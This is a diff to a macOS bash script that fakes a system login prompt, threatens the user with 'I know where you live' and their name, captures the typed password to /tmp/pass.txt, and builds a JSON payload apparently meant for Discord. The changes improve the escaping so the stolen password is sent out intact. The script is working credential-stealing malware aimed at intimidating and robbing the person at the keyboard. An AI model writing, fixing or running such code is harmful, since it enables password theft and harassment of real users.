@@ -1,5 +1,5 @@
 #!/bin/bash
-# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON with Improved Escaping)
+# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON using awk/sed)
 # ------------------------------------------------------------------------------
 # - Displays a login prompt with two lines:
 #     "I know where you live, [FirstName]."
@@ -28,11 +28,6 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 capture="username=${username}\n____________________________________________\n\n"
 
 # --- Define AppleScript Login Prompt ---
-# The prompt displays:
-#   Line 1: "I know where you live, [FirstName]."
-#   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# It repeats if the user presses OK with an empty string.
-# If the user cancels (error -128), it returns "CANCEL".
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -130,8 +125,9 @@ else
     echo -e "$capture" > /tmp/pass.txt
     
     # --- Manually Generate JSON Payload Without Python ---
-    # Use sed and printf to escape backslashes, quotes, and newlines.
-    payload=$(printf '{"content": "%s"}' "$(sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g' /tmp/pass.txt)")
+    # Use awk to join all lines with literal \n (note the double escaping) and sed to escape double quotes.
+    content=$(awk 'BEGIN{ORS="\\\\n"} {print}' /tmp/pass.txt | sed 's/"/\\"/g')
+    payload=$(printf '{"content": "%s"}' "$content")
     
     # --- Debug: Log the payload for troubleshooting ---
     echo "Payload: $payload" > /tmp/discord_payload.log
